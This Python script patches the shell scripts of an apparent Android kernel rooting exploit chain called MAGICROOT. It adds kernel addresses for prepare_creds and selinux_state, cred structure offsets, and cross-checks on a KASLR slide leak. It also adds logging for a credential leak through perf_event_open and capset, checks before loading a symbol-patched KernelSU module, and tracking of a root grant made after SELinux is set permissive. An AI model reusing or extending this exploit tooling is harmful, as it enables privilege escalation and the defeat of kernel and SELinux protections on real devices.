#!/usr/bin/env python3
"""6.12.58 / 6.12.38 adaptation pass:

1. profile-level KASLR cross-check constants (prepare_creds/selinux_state links,
   minimum votes/anchors/bytes) so run.sh can independently verify the KASLR
   binary output against the known symbol table (double validation);
2. explicit cred-leak self-check / perf error hints in run.sh;
3. ko_patch PATCHED/MISSING self-check that fails closed before module load;
4. ksu_grant output capture + method logging (reboot syscall fd path);
5. profile metadata (cred/task offsets) exported for auditing.
"""
from __future__ import annotations

from pathlib import Path

WS = Path(__file__).resolve().parent.parent
K = WS / "main/app/assets/kernel_profiles.sh"
R = WS / "main/app/assets/run.sh"


def patch(path: Path, pairs):
    p = Path(path)
    t = p.read_text(encoding="utf-8")
    for old, new in pairs:
        if old not in t:
            raise SystemExit(f"anchor missing in {p.name}: {old[:90]}")
        t = t.replace(old, new, 1)
    p.write_text(t, encoding="utf-8", newline="\n")
    print("patched", p.relative_to(WS))


# ----------------------------------------------------------- kernel profiles --
patch(K, [
    # reset profile validation variables
    ('''    KASLR_BIN=""
    SYMS=""
    KO_TEMPLATE=""
    KO_COMPAT=""''',
     '''    KASLR_BIN=""
    SYMS=""
    KO_TEMPLATE=""
    KO_COMPAT=""
    PROFILE_KASLR_MIN_VOTES=""
    PROFILE_KASLR_MIN_ANCHORS=""
    PROFILE_KASLR_MIN_BYTES=""
    PROFILE_KASLR_PREPARE_LINK=""
    PROFILE_KASLR_SELINUX_LINK=""
    PROFILE_CRED_LAYOUT=""'''),
    # 6.12.58 constants (verified against refs/device-dumps kallsyms)
    ('''            KASLR_BIN="$D/kaslr_slide_61258"
            V36_BIN="$D/t64560_v36"
            CRED_BIN="$D/t64560_cred"
            ksu_select_ko "61258" "$KSU_FLAVOR"''',
     '''            KASLR_BIN="$D/kaslr_slide_61258"
            V36_BIN="$D/t64560_v36"
            CRED_BIN="$D/t64560_cred"
            PROFILE_KASLR_MIN_VOTES=3
            PROFILE_KASLR_MIN_ANCHORS=2
            PROFILE_KASLR_MIN_BYTES=8388608
            PROFILE_KASLR_PREPARE_LINK=0xffffffc08019c448
            PROFILE_KASLR_SELINUX_LINK=0xffffffc0827e7a60
            PROFILE_CRED_LAYOUT="6.12-BTF task_cred=0x900 cred_cap_eff=0x40 cred_cap_bset=0x48 itimer_node=0x78 slot_stride=0x100"
            ksu_select_ko "61258" "$KSU_FLAVOR"'''),
    # 6.12.38 constants (prior vmlinux/BTF validation in docs/kernel-61238.md)
    ('''            KASLR_BIN="$D/kaslr_slide_6138"
            V36_BIN="$D/t64560_v36"
            CRED_BIN="$D/t64560_cred"
            ksu_select_ko "6138" "$KSU_FLAVOR"''',
     '''            KASLR_BIN="$D/kaslr_slide_6138"
            V36_BIN="$D/t64560_v36"
            CRED_BIN="$D/t64560_cred"
            PROFILE_KASLR_MIN_VOTES=3
            PROFILE_KASLR_MIN_ANCHORS=2
            PROFILE_KASLR_MIN_BYTES=8388608
            PROFILE_KASLR_PREPARE_LINK=0xffffffc080b8a21c
            PROFILE_KASLR_SELINUX_LINK=0xffffffc0826663c8
            PROFILE_CRED_LAYOUT="6.12-BTF task_cred=0x900 cred_cap_eff=0x40 cred_cap_bset=0x48 itimer_node=0x78 slot_stride=0x100"
            ksu_select_ko "6138" "$KSU_FLAVOR"'''),
    # export profile metadata
    ('''    export MAGICROOT_KSU_MANAGER="$KSU_MANAGER_PKG"
    export MAGICROOT_KSU_LABEL="$KSU_MANAGER_LABEL"''',
     '''    export MAGICROOT_KSU_MANAGER="$KSU_MANAGER_PKG"
    export MAGICROOT_KSU_LABEL="$KSU_MANAGER_LABEL"
    export PROFILE_KASLR_MIN_VOTES PROFILE_KASLR_MIN_ANCHORS PROFILE_KASLR_MIN_BYTES
    export PROFILE_KASLR_PREPARE_LINK PROFILE_KASLR_SELINUX_LINK
    export PROFILE_CRED_LAYOUT'''),
])

# ------------------------------------------------------------------ run.sh ---
patch(R, [
    # KASLR: independent cross-check against profile link constants + thresholds
    ('''[ -n "$VOTES" ] && [ "$VOTES" -ge 3 ] || { echo "FAIL=kaslr_votes"; exit 2; }
[ -n "$ANCHORS" ] && [ "$ANCHORS" -ge 2 ] || { echo "FAIL=kaslr_anchors"; exit 2; }
grep -q '^KASLR_ERROR=' "$D/kaslr.txt" && { echo "FAIL=kaslr_validation"; exit 2; }
echo "KASLR_ACCEPTED slide=$SLIDE votes=$VOTES anchors=$ANCHORS"''',
     '''KASLR_BYTES=$(sed -n 's/^KASLR_BYTES=//p' "$D/kaslr.txt")
KASLR_MIN_VOTES=${PROFILE_KASLR_MIN_VOTES:-3}
KASLR_MIN_ANCHORS=${PROFILE_KASLR_MIN_ANCHORS:-2}
KASLR_MIN_BYTES=${PROFILE_KASLR_MIN_BYTES:-8388608}
[ -n "$VOTES" ] && [ "$VOTES" -ge "$KASLR_MIN_VOTES" ] || { echo "FAIL=kaslr_votes votes=${VOTES:-none} min=$KASLR_MIN_VOTES"; exit 2; }
[ -n "$ANCHORS" ] && [ "$ANCHORS" -ge "$KASLR_MIN_ANCHORS" ] || { echo "FAIL=kaslr_anchors anchors=${ANCHORS:-none} min=$KASLR_MIN_ANCHORS"; exit 2; }
case "$KASLR_BYTES" in ''|*[!0-9]*) KASLR_BYTES=0 ;; esac
[ "$KASLR_BYTES" -ge "$KASLR_MIN_BYTES" ] || { echo "FAIL=kaslr_bytes bytes=$KASLR_BYTES min=$KASLR_MIN_BYTES"; exit 2; }
grep -q '^KASLR_ERROR=' "$D/kaslr.txt" && { echo "FAIL=kaslr_validation"; exit 2; }
# Double validation: the KASLR binary derives SELINUX_ARG/PREPARE from its own
# hard-coded links.  Recompute them from the profile links + slide and require
# an exact match, so a wrong profile/KASLR binary/cache can never slip through.
EXPECT_PREPARE=$("$D/addrcalc" add "$PROFILE_KASLR_PREPARE_LINK" "$SLIDE" 2>/dev/null | tr -d '\\r\\n')
if [ -z "$EXPECT_PREPARE" ] || [ "$PREPARE" != "$EXPECT_PREPARE" ]; then
    echo "FAIL=kaslr_crosscheck_prepare expect=${EXPECT_PREPARE:-none} got=$PREPARE link=$PROFILE_KASLR_PREPARE_LINK"
    exit 2
fi
SELINUX_BASE=$("$D/addrcalc" add "$PROFILE_KASLR_SELINUX_LINK" "$SLIDE" 2>/dev/null | tr -d '\\r\\n')
EXPECT_SELINUX=$("$D/addrcalc" add "$SELINUX_BASE" 0xfffffffffffffff9 2>/dev/null | tr -d '\\r\\n')
if [ -z "$EXPECT_SELINUX" ] || [ "$SELINUX_ARG" != "$EXPECT_SELINUX" ]; then
    echo "FAIL=kaslr_crosscheck_selinux expect=${EXPECT_SELINUX:-none} got=$SELINUX_ARG link=$PROFILE_KASLR_SELINUX_LINK"
    exit 2
fi
echo "KASLR_CROSS_CHECK=ok prepare=$PREPARE selinux_arg=$SELINUX_ARG votes=$VOTES anchors=$ANCHORS bytes=$KASLR_BYTES"
echo "KASLR_ACCEPTED slide=$SLIDE votes=$VOTES anchors=$ANCHORS"'''),
    # cred leak: log the perf self-check line and give hints on perf errors
    ('''if [ -z "$CRED" ]; then
    echo "FAIL=cred_target"
    exit 5
fi''',
     '''if [ -z "$CRED" ]; then
    echo "FAIL=cred_target"
    grep -m1 '^CRED=NONE' "$D/cred.log" 2>/dev/null || true
    grep -m1 '^ERR=perf_event_open' "$D/cred.log" 2>/dev/null || true
    grep -m1 '^ERR=mmap' "$D/cred.log" 2>/dev/null || true
    echo "HINT=perf leak (kmem_cache_alloc tracepoint) failed; check tracefs/perf_event_paranoid and SELinux state"
    exit 5
fi
LEAK_LINE=$(grep -m1 '^CRED=0x' "$D/cred.log" 2>/dev/null)
if [ -n "$LEAK_LINE" ]; then
    echo "CRED_LEAK_SELF_CHECK=$LEAK_LINE"
    echo "CRED_LEAK_METHOD=perf_event_open_kmem_cache_alloc+capset"
fi'''),
    # ko_patch self-check: parse PATCHED/MISSING, fail closed before load
    ('''        "$D/ko_patch" "$KO_TEMPLATE" "$D/ksu-patched.ko" "$SYMS" "$SLIDE" "$(uname -r)" > "$D/ko_patch.log" 2>&1
        KO_PATCH_RC=$?
        cat "$D/ko_patch.log" 2>/dev/null
        if [ "$KO_PATCH_RC" != "0" ]; then
            echo "FAIL=ko_patch rc=$KO_PATCH_RC"
            return 3
        fi''',
     '''        "$D/ko_patch" "$KO_TEMPLATE" "$D/ksu-patched.ko" "$SYMS" "$SLIDE" "$(uname -r)" > "$D/ko_patch.log" 2>&1
        KO_PATCH_RC=$?
        cat "$D/ko_patch.log" 2>/dev/null
        if [ "$KO_PATCH_RC" != "0" ]; then
            echo "FAIL=ko_patch rc=$KO_PATCH_RC"
            return 3
        fi
        # patched/missing self-check: a missing symbol means the module would
        # fail to load with ENOENT later; refuse before touching the kernel.
        KO_PATCH_LINE=$(grep -m1 '^PATCHED=' "$D/ko_patch.log" 2>/dev/null)
        KO_PATCHED=$(printf '%s\\n' "$KO_PATCH_LINE" | sed -n 's/^PATCHED=\\([0-9][0-9]*\\) MISSING=\\([0-9][0-9]*\\).*/\\1/p')
        KO_MISSING=$(printf '%s\\n' "$KO_PATCH_LINE" | sed -n 's/^PATCHED=\\([0-9][0-9]*\\) MISSING=\\([0-9][0-9]*\\).*/\\2/p')
        SYMS_N=$(grep -c '[^[:space:]]' "$SYMS" 2>/dev/null)
        case "$SYMS_N" in ''|*[!0-9]*) SYMS_N=0 ;; esac
        echo "KO_PATCH_SELF_CHECK=patched=${KO_PATCHED:-none} missing=${KO_MISSING:-none} syms=$SYMS_N template=$(basename "$KO_TEMPLATE") flavor=$KSU_FLAVOR profile=$PROFILE_ID"
        if [ -z "$KO_PATCHED" ] || [ -z "$KO_MISSING" ]; then
            echo "FAIL=ko_patch_selfcheck_unparsed log=$D/ko_patch.log"
            return 3
        fi
        if [ "$KO_MISSING" != "0" ]; then
            echo "FAIL=ko_patch_missing missing=$KO_MISSING patched=$KO_PATCHED syms=$SYMS_N flavor=$KSU_FLAVOR"
            echo "HINT=syms table does not cover the module's undefined symbols for this KMI"
            return 3
        fi
        if [ "$KO_PATCHED" -le 0 ]; then
            echo "FAIL=ko_patch_patched_zero syms=$SYMS_N"
            return 3
        fi
        printf '%s\\n' "$KO_PATCH_LINE" > "$D/ko_patch.self" 2>/dev/null || true'''),
    # grant logging: reuse path (before permissive)
    ('''    while :; do
        if "$D/ksu_grant"; then
            cat "$MARK/ROOT_ID" 2>/dev/null''',
     '''    while :; do
        : > "$D/ksu_grant.log"
        if "$D/ksu_grant" > "$D/ksu_grant.log" 2>&1; then
            cat "$D/ksu_grant.log"
            KSU_GRANT_FD=$(sed -n 's/.*fd=\\([-0-9][0-9]*\\).*/\\1/p' "$D/ksu_grant.log" | head -1)
            echo "KSU_GRANT_METHOD=reboot_syscall_reuse fd=${KSU_GRANT_FD:-?}"
            cat "$MARK/ROOT_ID" 2>/dev/null'''),
    ('''        echo "MODULE_LIVE_FAST_REPAIR_RETRY try=$_reuse_try"''',
     '''        cat "$D/ksu_grant.log" 2>/dev/null
        echo "MODULE_LIVE_FAST_REPAIR_RETRY try=$_reuse_try"'''),
    # grant logging: reuse path after permissive
    ('''    if "$D/ksu_grant"; then
        cat "$MARK/ROOT_ID" 2>/dev/null
        echo "MODULE_REUSED_AFTER_PERMISSIVE"''',
     '''    : > "$D/ksu_grant.log"
    if "$D/ksu_grant" > "$D/ksu_grant.log" 2>&1; then
        cat "$D/ksu_grant.log"
        KSU_GRANT_FD=$(sed -n 's/.*fd=\\([-0-9][0-9]*\\).*/\\1/p' "$D/ksu_grant.log" | head -1)
        echo "KSU_GRANT_METHOD=reboot_syscall_reuse_after_permissive fd=${KSU_GRANT_FD:-?}"
        cat "$MARK/ROOT_ID" 2>/dev/null
        echo "MODULE_REUSED_AFTER_PERMISSIVE"'''),
    ('''    echo "REUSE_AFTER_PERMISSIVE_FAILED fallback=full_chain"''',
     '''    cat "$D/ksu_grant.log" 2>/dev/null
    echo "REUSE_AFTER_PERMISSIVE_FAILED fallback=full_chain"'''),
    # grant logging: full chain step 7 (2 call sites + method log)
    ('''    MAGICROOT_ALLOW_SHELL_UI="$ALLOW_SHELL" MAGICROOT_BOOTSTRAP_SHELL="$BOOTSTRAP_SHELL" \\
    "$D/ksu_grant"
GRANT_RC=$?''',
     '''    MAGICROOT_ALLOW_SHELL_UI="$ALLOW_SHELL" MAGICROOT_BOOTSTRAP_SHELL="$BOOTSTRAP_SHELL" \\
    "$D/ksu_grant" > "$D/ksu_grant.log" 2>&1
GRANT_RC=$?
cat "$D/ksu_grant.log" 2>/dev/null
KSU_GRANT_FD=$(sed -n 's/.*fd=\\([-0-9][0-9]*\\).*/\\1/p' "$D/ksu_grant.log" | head -1)
echo "KSU_GRANT_METHOD=reboot_syscall_chain rc=$GRANT_RC fd=${KSU_GRANT_FD:-?}"'''),
    ('''        MAGICROOT_ALLOW_SHELL_UI="$ALLOW_SHELL" "$D/ksu_grant"
    GRANT_RC=$?
    echo "GRANT_RETRY_RESULT try=$GRANT_TRY rc=$GRANT_RC"''',
     '''        MAGICROOT_ALLOW_SHELL_UI="$ALLOW_SHELL" "$D/ksu_grant" > "$D/ksu_grant.log" 2>&1
    GRANT_RC=$?
    cat "$D/ksu_grant.log" 2>/dev/null
    KSU_GRANT_FD=$(sed -n 's/.*fd=\\([-0-9][0-9]*\\).*/\\1/p' "$D/ksu_grant.log" | head -1)
    echo "KSU_GRANT_METHOD=reboot_syscall_chain_retry try=$GRANT_TRY rc=$GRANT_RC fd=${KSU_GRANT_FD:-?}"
    echo "GRANT_RETRY_RESULT try=$GRANT_TRY rc=$GRANT_RC"'''),
])
print("done")
